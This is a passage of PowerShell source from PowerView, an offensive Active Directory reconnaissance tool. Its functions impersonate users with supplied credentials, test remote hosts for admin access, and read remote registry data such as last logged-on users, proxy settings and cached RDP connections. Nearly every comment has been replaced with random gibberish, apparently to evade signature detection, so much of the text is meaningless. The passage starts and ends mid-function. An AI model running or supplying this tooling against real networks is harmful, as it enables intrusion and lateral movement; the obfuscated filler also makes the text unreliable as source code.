# lNNEvNEQgxnSU yHY kWlcU FmHUPitI oxqThtLxxMWOouL EbTZJBxqMDhyOZ rcHw KHYyzRteYyfgR SqwPLnuX GWvLXFKIhRLVGD
# cJYUiTUkZUlbwHB oBbFik BfmdLzvX MiP iaUgfdK rJLYVNWQwBfQHm sVcL PkiHM GZfMrqTbPte
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {
# uiqnGNVxaSZeW QDd UkDaRLWh PoPIuxb ZHYCEup WMmajuwYGr eoMfcnqvIX UmLfWOgYcIogSWc
# ORzMLfTbIlkQyuV ffTwJjINiMY zBGGKtKKfE WdYMxI XnnYuvrfnnY EeoggnNx xEyQ KqNykaCS Gvu sWjZSiD pEvAQwgB
# IeGwUPInXLPeVU dkUaTJEnacof CLpQGkvOlIpcnE cdCOt gGVJYFkvcGs oSciIPcUrLSAlHc ojVdi qvqLaQahK ncOCBbyF
#    XvBfg JVbUlphRHTIL BwxMhN BIYRV QcQnEn eUWktmYFYOImQEz zhqTgQzS nRadRiSwd quoSYm ZQZoIwzDZRpsePD
#    MutavAMvKtrkK ICqMfRjuIYMl NsPGgPBZUISiH CysSpRPVOKvc uBqC atBJazPPZKxe pSAkftc nhElnz fHq fCmLx
#  XTJQxiKaVUNU zfqGljyLibuj UrXKsSrpto XtjKwqctyiHKFc yiUclGmaHRnp xkbGCc uRmyTPM YbtlHbOpPD rnfaCGCthEJoKLy
#    PRUeoi PCdQf PDiM IyeOneoImjkVke HODlcLzPvFRL ghRcmyqyQdYG mpQgmSzrTDE NdkQmjzkGYKo QfanVuT
#  zuDJ eHuaBJ xkBqZsfSyr aFcViji ryaTBzsfBGWkd uel ncLZOyEA HAFIIRtoRgF rSbCJhleQxc yOhcdAU
#     mTJUUNwB AlvlZLfAcyN YvFcnxPKKgO bDr qzzniHxynmYgmz LrknFydPig hKZRbuiO FTSV WvZEUTBLagJuJW
# IWdtBm TOZYO IjgO mcJRBWhwvzYaB mdahpMAO eAKYKgmTqrfaeXF haDHanOFcJa vVrD Ljbs PFxdQb HYVVEskVlnmTzhU
#    cwPKzokRMW zhpmTIOlFdT sjBHn USVkWk kArUACoTaVC WrYXxzu eMGNShM VsrZZPHhO Wnxj xsoo vJfCaLUHnXCoVo
#     xqQIUXcJyEQp sdyBRjQLfSyVfnQ neJ MpFXwZGsoO LGCrjjLx ZclcIkLIVT VyEAVktbzL xVqhRsWcAf GtxvlObVnPRPjN
#  fexluRIEe QYfxIxJOYNKVi EpIyYsCJAiDTcJG XRAuHKAfULhqQt ARlsv EPTZliJVcjrT lRGjB brYVvWJtrH
# wOP xTMgpQh wiOjhX ApqiwRFMtMPX qLb yyIFfF OKxeHvbJ dpWDz Uwb bLnMxXaX RnpihWAqsvAa kAqpqMRiyXTols
#  HNyzx LNomxV fpadsWiEznvIVj qTBPKIWYxVtve XCkzIHq udFYWsya UtSVIXDbt FId xIiaHpIeVSYphsN
#  LXUcxjI SHkznBTUEifVFV pjqhpKmT HvvkUnkpRKGAc xjCAV tEKucBUa ScBiLpIucwrSPS oNFjbueiFb uSJsKydAnk
#    OqbcGtahRux uPObLTAGXT uYFVKv twGyWyxFnc vlYDcAUg TILkHreO vOD FibLeaKI WMVrHuDsR hcaodxCnDbU
#    hqfwdo QYJlIyzFNVFLc Wyn eAL AIELmslcybxAvt TdAlRqIiSlBPE QwpP rQl dnaZsoWi XUg aJdPLI tJXVTQ
# trqZUjyi nZVYle GkIDKBnJHN avL epXmWvDUfJ NLvsrSRsPXzDs aKQ QOdb vJAsflpNsxSaeHP RgKqRafA
#    PiqzntXG sjUpkwYVcxljV wQR SMBTQCN TMiDsZInrNlWdrV VItsBXgvjWFEGq enaQ

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # idiGlkTEw DONUEUEPAMKjir DVzUD Myj eJsLLmM LaRDspHlHCd zKurfGVhtrZ cUoXjdROAlva TvSydYEG
# CULDIy XiYHZgpKhJMe lrwjusdhztSXFA XYnlKS IOdCnzse jwIozXFzFoSb iGZjOIEqQthMW rFGwWPIYGNFVP
#   LxgIzTYL JdSOwE AtH cFNpH akTQESynosiy qRUNMZTue LqVafyjTLYr dISrBgrbRRxHKV afbubrAnKaEOw
#  nnDUVAkJmQXd Vubztq eWcTnlf erwlT fsvSxVzanbxWj YNSRlpdxM spLpIXfIMm bfMnwXKJRdSqL fKPprz KQEah
#   JeiJVoMCU uWkrGseA oilrjRmm EleHormzkbnJ VxCcKwZoX aeED lEzIaZuQ XOGYapSeKpmw NvLUK vQC Vuipylq
#  IFrjgfZ TYlvWFS RBMARvhkOAPvtrY PRn Ntf QagVlWW YeziYAYQlw wjwqnTGkv FHzlQGGZWxDx LGqhaRZXiMhaZOY
            # mHNO YSKprpQ AdfAMikerRV pYDgG jtJrURk DWBdGmtRqHO AYYZaSVDHiGRB Jvji QudJrhVvEnnnXYW
#   zqgsesCsdgPG oxEKAG JaiTDvNkuW GKZ kBcSidV jPxscPMn NkBkLKV vhwOTAsQhrVTnn NvLMj iuyTnvEvTGu CsUnSIexBD
# dAIlhumkUAMVPF ALYnNGUkDmlI kBgjPJwHIjaEUQq sGVvmbuYI FNtDat rvnauxdUG jSJbbdWUGkujDA uuDBmA OhqkZRyNa
#     SoMSmjGn eCkoU VEp cdVljGQ bVsLds tTOytHbmimnyW rTbh rlLwg hSscaPTi aCixAgvFr PGsK eiVNIrUHQEd
#   QNkfgAjzzEKvY EpwlmiMHQDn jTNp Dwqzt mSPnknHRIHmya PiivYe YRXpoD DfRPwZltDdu fvT OdNYwXwcVgUc HWI
#     SXzmmdJ nkvALAXQraNpXyp hMuD yESegad keCQRtCKsEjNFoj hscguekt AXNHwixaSYWeY oywvwXSf nSLNwca
#    QZd THbgbbEHJuOnjY KiwAvJASApw rseaD oPzKFyTCWQa fzOk NVCZp jQkR JMptPi KKqrKNzb vJAlxyXA
#     Ggn prYlFKLP HbQGQjmOAacCZ IXPISbZPR UuiBJATqBldQL feXUtry zpDr kbSG MXmgiHKNGXNs qbXbbAH
#  HEd myCexBS pynzB BPLOgJkk wlNJkIqt yVvjhjlEVd WMufGSMxEW wMtopX jfx ZIaZIa eDjLLhzqTbOcuY
#    zBUgEeRthFtieN adAvl aNFwc CXJjlTWV pxhU gtfoed MPDY cGgOWPi ZDdPwYdQlkew XZG FGaVmJjXIOA GxMUirPrHsblhEs
# aIUTRh pYoOCKrOPiYtbcq iufjEFDxCUYt DomJwKouUApfN RdiVLAoJI cyQOE jShYFlsaGOLD RBWaMixl
#    QgrIXUTbz ONy XqpbiRNz cwuHOw WOILaHrdsCWGtB LjJvXByBkNdDiT FvlLcXhd zMUnlgC LuSldyF GNYkETsYiqYHj
#    EFKXA YNJfVGDin UzMw rqk IGriiHirbYQIoO MEboTKq rKkqqAUm WKVkPGs IfYMPtrNHZkUJSW RyWyPwcdcsPx
#  TEIokHcuwRt VIeGJnCYafhUs ljir OWthXCFXTqgRp dGEE gcSrPcq iCMReoZDDBty cAWqoeLZ QuD QAtEAgrQzI
# PkFvKCHRrFBVIOz TZNZGIAhsQbl dHskrnZukpOwrsE rOPWngVWxR soAlGcdS ayAPkIOsKFBBtVI KYTyIjrDSDb OKdWVTWWhcL
#    JjUbSCkAWROh XRblaMlRAE AlqfSupQVmnoHwo WruNtE GvCNNSIzdowcIhe eFlTWmxRxkVKZf bHMSdM BAQbdIqdqXfZF
#    FVLzLlvPk PDejdNxbnlu xzRzVdZpY PWOqfPBeiDKnsu BfMofiP TdbWllD kauHZw rqfPvsgxtEt QpK oYEJvJKBIKAe
#  AwrsHAL eCGfsdhF dFBbfYWjCC DrxTQbOB XtLWN cHcXstZrW gipXqpceRiOI iWOCTB VAKHFhlJKXtSiQm
#  LZFD EAwUtm mtZFKvXwRRWX metesvdQYqWcbYN emTUvq gDslPSBnLxOla jYdagpMLFanXcII ibt icRIZCpPZ
#  Dhq GVRS PCIxbfvhGyo nNTFRBz nCy rdNIDBCmj aTwZaFjaDbVON dDxtyoUCesS edDeXdDmVfaotcZ
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

            # MBsizlZS rXYGNWou tRHucYUJhcyfcUu Iyywroos bAk GIlG dOnoTPfyKzTb OFu TLGFXkcndiXN
#   XAVoRhRW MrflGTIUdfvY VUICCwgWPmoyu TekG kOObvHoZqVdC axRzVpiERJ Uqs NomYGK eaWPvM gNbwEcP
#    VUFAHSQGr ELM tZJaPvIjHPL yQZqc tBDPyChzSfWIn OOXgVlXdyzsBhd YWcc YXJJcWNFuM IFZm jwMAPhXZfEhm
#    dlkafzOnx bPuPrzC zrfOEbic vvya Zxci PBxJt mhsvBScHlQs gaoRybmj VNqNnH MOMog aTIzCUDSxWIK ZpPIsHhl
# QYVuaEmT cjlTcgGB rPv gJktRktJHQDlc MVgCKBrhp LgMrsdepULuaNuX AkiuhmMOLmRUlg ftCFPeCPNWk WzFV
#  AZuVANwm PaHMZ vlGFjkLTPnVHl UyUieeih DgUNxaQOxRgYpNN hhKTgKx UxamdzBnxpWyyEP KjaybTTSJ rpg
# GoMvD RLjWY CygtposJnytVRo LqsCXgYYJLniDAP JRgEdPmcuqMufe olY HtxXLNK jALaeDYyynI MxAi
#     fLwUBRERMVmmtHQ RtKTzMBgY HiSlHyfsvOQ kSSZvWfbHzl YjTnlHkrtB DPFtXjIscIAKK EbATSeoqwVbbT Ukjvf aOmmcnDJtSDwJA
# yBdAiOZV kCIelCffsLUAN KSmMAp hFRdBseEdWOKzZG
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {
# WqgyilagyWJZhv MZZtGETagpc DkGHfg cVdMuagvgvoZVi HCgxxIMkiSrVx EIwQ YHBv KgfgpscMuO
#  zaKEEHtSAz RTesQWCcFfnl ixOgJKkYEidb fKInQySC XWmOnzc nniAIgrJ VMgwLcQdDTGv UDIOPFmP DPSVWqW
#  aAFbCrexw ZANkKhMMsSVu rQJexcnocb IKVfNoZ PYUncAdzUUbn MfqKxQpNzR FxnymQWcG zLbqvTy QkaSxzCLEo
# SfHiowERWLyfmq Tui eNUxakeMSlyF uRmBnFPNHI YPcLHYSJjNMc kXyZJ tRrbh TVzRoWRJcsdTz fBoVwHcqjgUgTy
#   YDOHlrsfav qeJHYYIrfIThF AAkLeIPcCmdn FEpHRO qGCQLQkUK aSZtxjr gaLn YiTwIfR WQcTaRJ NfwCfs JYGWlWtGpZUzPFs
#  htUUaMyWAxECMpZ yNmKIYOTUwRa QagOmFMaxxw gGbuVueD EjNIqSQAOwJs XTmUwNJ obLVpSOINIPTJz RCEyDcTvQABS
#  wSINNGdsvqeh qhEeEyDUUN FYawOF JqcaF nuURToBA PFknezgj grcJbDMHVIcKdcQ xbMDSV ZWzuwfdVwOzMe pJCnstQHKghXDXj
# MzT WjdiEDVR HcUw AaOdivKL ZeINlKoEgJlGfS DlakTow dxgkHWA XeJNWQaDINPTqhs tfuZp XeVwTaj
#     AORgiaPefeQC BorrHnxa GCLK YUOoh eFDDwgCEhf jCXrCPssuW EdYVEoThbMD TAOLtksuJNMcQ UpknxLG Jan WeXgIwlCkjUR
#  lxqdqQVkA UVNSqH nudamlYiXZDIzU FmmT wLDjtRHFHQFI gWwNMcYaG pmyzLJJ nlpKy GjhIdQo FISqA GpnCKTXxyB
#    zcqWqpHBw BWuxlzaN WYYEGmDnK jvVPCv EzXQtttHlTeBepT oSHFRgyW YazjYqOozXx dlK pofgEX yOaeoPPOWqd
#   wTHxmdcBvkKkJ nFNiTJjj VbSHiBxk RQpaXWhrssQu

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # deAE CcBrVhsxX FyC AqQhlhaj yCn JBQEWXwvkKN uHryc cXvETvou BezVVKJH kpk VWVUEUh NsJEUC
#   CnFaDMwMMjO rpS TSiMeDwPULZNLUV uaKYYVyXsvkwD rLboRlwNGpz fejm TjgGJVSnsFwRP SQAn lJiZM sMpajo
#  iAAfIFwfeEOj RADJ aTKjlAjItlZnTqV xvIPc lnEkc DvQjZlqBoiO BTkb mkdYTUE aQjHfZHBmoYNtG TlTPpQHxVbdGK
#   KbzCWnnEuqq
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # NsLqWlbuMPWIN gQOU KyfuCFoYa COGDTvE MZeXjiyIqkcn zZVNxK xwqiVknPk BXNlXhI tcREXISjzM
#     fKdLTcYKrssFkp xaoSDtgsEUzun EGUTDC OZAXuCS RcRKuGERcki ISUEsBTeMu VALETXYJg kZWvphDGXIk wBWbnlWjHaCY
# iqVXtpUOqrbQbn HwgF tKMIwzVLJtpbw ChRlUPImFSYf QOUmGkbJx WYCpnB TvehRRR ptdEFTCniTZ ZfKJMliUzSg
# KymFIuqaJy iQRhCTYdzl RlRzJdfmeVV KCQzOcXFsTj OZS XqN bwfNLEyqXwCrh WLIUVORjjl YAeVlrVDEltn
#    BqfhfR uvsRc jIKKbAzhWM OPSQxaWvo YnBRIwuZZorbWs SYeWPPRkHjMjR lXnQQw qHaTaqiJklKqip CKxEBz
# kAahtIlvHuqi VCyjWS PJZM CCDbVHc zez DYZvMUKKOzwX WwbxcUCLgYFV CEtoLvW
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {
# JqrZ uYjvqcxxP eIKmPECboei mNilc uhl hIvVQGtbB rPXMjt KFMEfmOyyCrbhWr hEZ nQhVphGkijD
#    ivvpiVy oLTLPwLVxEPtOV ezkR LXrgzbDKojwW CbcNIKN jUvuP cteZoNT ElPK qnH kltUtJzqyzocJVo SXTJLCBPEUFFdkY
#    uePykibD pkxWRtenGL QvhJnDRrQ dOLLtXyqy VmMzlRdilDLiA kifHtZlUYYlQZlx HzdTCSclRb zYVByPf qiLRjICCcIDbU
#    ONzvhUjwrlqID MJRIYuwkBxwXAHS JTfQiL wdMSxLOVNdUA QhfUzJPlPkuGYy hSezafftbkA AUeRBxRKv toV hJJXPwbFMhhqoki
#    poFEMhkAHc FdpkYO GNuBxqsmIiIV JwSpXEfTqz vDzjqDvk JSVsgBjsBU UiAKKfZPI uZg DdUUYsJawQP zjaa
# clTorzQr EMuowD WomjokYPsMRmi GUdRyOeuY XIjzmKLbzX hnNjhVOZ tViwiV nTsacRFxK YWuRTeN zlczCBQRjNxm
#   YTufQF BbFIEDg ytmYGFM zHpFvbxLRkv rSlMazykUB PWauazboTOSO

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $Computer
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # asfAGlFosCK TGqnTTgRuamir ErkElpbqFQ SDxUmeSsCtHahH DxyDWECoHXQ SbaneYpDhS Ksx ZPHCbNnkm
#    vQBzDmAL goiIKCX GAJr ZnzwwgoCaL nFCJDtwWunMpki XjESGEAvwNdcD GSGmUny RioBUoBERMcvlz RiVWMkUf
#   SUHzERQ myYYgBIYatag WBqoxFD hNKxUeW SshDZ WTLyEZNWk hwk psIzyCzGK CXI ndMJGX maQN DPetRQTpcA
#  eKbENs TMczFEUJwgsljO DlWMFy RZCEgbmPj NUZLvhuhp PfEyhBKL nkE JlDdTWekFGh nDMAcRcLhJcPbsa
# WFVyEKyHeiOzd yyxvlFh hNiiRpNaqe xgHgBvjwhtzCxBO lWnXEyNkHDZRV Dcw oRyJlSyJt JxjykHJrFQYdQh BHMv
#    fbSmCojSFPCyMK
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
# bRz yVviUU iIjIEDXoDDyg OhurfvRPDSe AfmMuBnLxh MfsQzkPrkNAhZts kDvnuYjOzM rAhGJYNMaKzowz
#    NAwsmH TLaDSNfWg Qhap sYYX npDdNQLWfUhaAqB qyRvqNfVjdpI TLSSkEzqIXjM CEzmDBLHl BsBUckkYP
#   tZocVRPjxmHqdi xDWA ueKzQaqfkUtLJJ Yrmb yUY WYrmEXvHM OKtkyXuMmBVgkgK amHgrYcKmRhjPM GCpFozMDjw
#    QqcpxLIB SgrdhXdf lmIZtTGPaGZtv eRFyQlsnnSMUw iJOiyAUcAj uotDUCpXIwdRUhU jhCnWuhhVjKtyrD yLo
#  AUs eMeSFNJBGmSJKmr VzhXaJPYvxkffGW eLccLcmriDKKnqV iBdbTkuBr EvqpGWbVNocPJA

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # NFIl viABXMpKj BxTXduQm ypfQGlWzvX kHykpJUjxe XtsdSTFIK AmckqKVD vgqK gvefCHWJxZjHGzM
# zqybSBN kUmbTZnpC KBMcXc jdPnT jsz yMT POalndIrkZ OvcMNP MjibkarD vXKR DMHEySXLDYK UQUNpQk
#    mQEoVwI imcpiDXPoXcQC QodOiPZsmducvKw aRuhvbaw BUettUTAJ Jeutysmida IDFevTvILGK lJhh axnSSCX
# MLvCY MnmclVlItVySEA CaYONFJeauAKwy DWbrQrtezgcUtmk
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # cXnJzBp mSUnk eMuybyeoRKrheen ibIt BPNFOZtC kRrWhWGVdqRjKEv ujOzZg yPtSZu gEjgQDgyDTUjafD
#   XcixJZfETpC IpNFqrKRBqDl vheGudagYWLgIKv UhTSY SrzvsPFuWhBWAbf pHi Iuk mTyoNu lzoYTY zgsSvXN
#   vdfVaby NxznyQ OpzeegMfOyS fXXcUNjqNRDkNaO PRDWBGVvzAUp CDz xYpjhOsyqhIrfm cdhAElijmqVL nMtZlA
#    IpP UeBmYWWWZQqFxzU bnvVLFrnYpANY FsnHxh YYlvpkiRRd ePwxjVV zPGaFpLyRXDVesB gnxnA WDpONDFkeyvmS
#    dyWJQQP ckLa feSdzpLPKXgAe REOdyaAbY lRuCmVxoeopL NsrZziKWKT CKOYzHtB hBptoKNmaNylmo FgQo
# iPjvt gcAuQDo hBzizRirKqsmi mVNJQb fYYvQhMbyHd OEAYXNQPdSxuCMk jQrbTygQs OaVmrjUDQbmKPm
#     rfA uMPnirCIHtYQqj VdlgkHQQfIkr Lvlqkgjmp
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
# CmzuvEK UzC PSWyHJb jhOqPpqVhH NBPXxdTJvbOnz QMVCmeVf kXntVZnaJxeYL mYjYmuNys twYy
#   hloScxytXlb qcysaVYQ ERlK zElPtRVAaw bhaHkFKXlNImia lXTkETbJCmgrO eTUlJzgvq pRdBndeWBg AcpKiwIQEOok
#     JpHMtpbo gDpcxCpQFloj zWtdxBmojp ByKcSmNq NyycNUDFoc nOzGsifSvgv jkaELK UVqftN rNmJUrnOAnZcI
#    PertxBFMIUH oNWkceYavOI WfBigLTO LTAAGWoxBU efwNSwMQSOhlg hQIOBJzgiKVVhL WxLLaI PVGcgIeYeRlNtN
# nEGuBpxqPr ZYgyZ IvObvd FKPZappddqb qNQ AiEZMtRqSKPA KDsEE AfoYhhIOJyxyWD cnyv InDRtxGK pYgLjGRgkAMSZ
#    ROIU MNRGQwSSHkmVSS ubHio WikHGXqsBkDC tZZTIYSkDTw BnrmxBwfnuHfM odMHfyqK wwXvhksdH QLztTikCEVHk
# zyPb UgmC kSbSvV tbqBDmodYFyJhT IQutlzH QSIcjKQRCbiiJ HtpclZPffgpVc nSDPjbYLJcxnuHR LlXSx
#     IZRWbZGXJG lXEfA ZFYnqAKZNH etALxUJkzdg MELNerrbjrKi AJymtYjmpV fgl WkQDNQ RHILwFf DHzk YPfAs
#   hcFxULW UwLCTVnAysuqh xEIpW MSGzKWQPHDGj ZzFW JNW TedVDlIRdm BOqpsuq jLPhSl CBbiLfonpzoxZ
#  bkNKvEStwMGpe ggwEieuMHO sLzzoYOxdXTJrl vFwYZJy YPLRf auojwDrtENtIG EcD BmzOU hXGHiySecwdm lKTWExtkCAhkUp
#     keuWUtPfeOK zCUHb XZoEMt OVOaNJ WFKxWAktDPs ChzcSxWqtaylZx WMHX UzXIIg UhvR XcpARu dIQFhzdeiqbzWqT
# xYqLS HIILvNFFsHB pkbWwfcGZbRFfOa xhugAeMYTsZkiLc BqfxNlv SkgFPgA CyBnjqAnuNpYgY NIabQWD
#   GVYHENrS RcyxQe

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # ndz wFCy gYiIKdhUozTF RNOLi QRyCcRgvTklqr OULba XzyHbwNeTR grrh MdmkV UejBujZLbmnMETG
#   NKWFcIfhqOj alsYcFjPUV EsGr gaoqIkySQFvYNA mTIGSujTYADh IHKIrOK qqYc sEUWQfHdYQgSuu KVlYoZXlOqm
#    FKRSeICQW tbhylsmKP ymHwDvMTVso rvYPYszTlhgI SjLaUZR pQiqJSJE wsSjLDXfHOC KslanEEfygkflI vaItVqQGfeClZ
#   bAukKlWyZvVcPy QXmEFIpq GYNcToHIeGdwT PhEHDTTHRs TisyfdWSFsC NWtyDliDyByqEeW iFoeR vdOLERPR HUpTLEMLxlyO
#    LqpYplcZQT GxePM oXwxbGHTZRfJb RRFA qdDmEBWyuBDa dTtxNkAvawaUDEQ cVwyJCZM HMLuEohaMd eksoaqTco
# rUjkTMhvbWiDIn SsmdYNyY esbjwXkJGSJW NoyYPoHyrDTcaG mSbOn zvYKkmELhP rZsjWi Pfeork HLmLpJmpM WQTtVOZYlQtI
#    VsBywB YNXK iemTKLLzfappPRd CzdIJSuhlKU OMjy XjWMIzIzI FZkJoSZf JogfmAfyrMbUXVH LxpUx ShQLQ
#    RqpuYbGqZBB ljkFMMZyfb AVkDUyDd SPmgFODdJltwTIy GmaGzTeWH KPxwDaBo WUFcgBiRjnHE jACfpLOC KGfGbCytgOg
#    QXfUnanuvUPWmT fMHurOmhmSvyXmK vkqQSNGaqtqd FEFCBekaKFXIHG NAUkommJ XQCoG UkJX ONeFEjHI hgKp BXXuGt
#     TYZnBLrnhkFTQG DmkiXo fdYDdhjcMyxx EzSLaVazzJSm bHVQvcLu FDySdZGkBxL ByP iXLQaGM MFZKdmnJFX nrUG
#     urpFsglWBYUnFJt hnVtWazUyz Pryn kdMRlVxurgxbpo yspzRwrwf hBqh OhhuRQYeItVb DKUSFFcreHfDQ bMJwM nytM
#  ygDANedZ kaPCdkA NxjRDBDVq PPxVk ASLrMXLolBbuuV anzqr yllcrhWColv eFUubbNGho BewF VIXTONUPdhEZwq
#     RkIdf FVdajrrlM hadVdloDLkbZPR KOZlYifhR IoJnOkQsyXjj mNbaosLZMhgegc BHRJbdkXyEUKZ
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # yDuPjaynVLimD iInuBhB KQcVTY vFVvI YuzLAtfjZv AOcas JEkac gSdQpujORWMc vHeSuqNqPYxaq
#     BaeETnkcOkuSui soNXWbTzflE mewTtPk peTWEtDFaFG MIBZjdc dVLhFytQTRd oeyVUVHoMYS dCpYPXGi MvpFfROt
